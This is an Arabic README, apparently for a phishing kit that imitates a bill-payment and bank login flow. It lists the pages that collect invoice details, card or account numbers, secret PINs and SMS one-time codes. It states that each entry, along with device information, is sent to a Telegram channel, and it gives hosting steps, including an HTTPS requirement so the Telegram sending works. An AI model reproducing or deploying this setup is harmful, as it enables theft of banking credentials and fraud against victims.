## تدفق البيانات

1. **صفحة البيانات (data.html):**
   - رقم الفاتورة
   - نوع السداد
   - قيمة الرسوم

2. **صفحة البنك (banks/X.html):**
   - رقم البطاقة/الحساب
   - الرقم السري

3. **صفحة OTP (banks/sms.html):**
   - رمز التحقق

## البيانات المرسلة للتلغرام

عند كل خطوة، يتم إرسال:
- البيانات المدخلة
- معلومات الجهاز (التاريخ، المنطقة الزمنية، النظام، دقة الشاشة)

## طريقة الاستخدام

1. قم برفع جميع الملفات على استضافة ويب
2. تأكد من الحفاظ على هيكل المجلدات كما هو
3. افتح الصفحة الرئيسية (index.html) في المتصفح

## ملاحظات مهمة

- يجب رفع الموقع على استضافة تدعم HTTPS لضمان عمل إرسال البيانات للتلغرام
- جميع الصور محفوظة محلياً في مجلد images
- الموقع متجاوب ويعمل على الأجهزة المحمولة
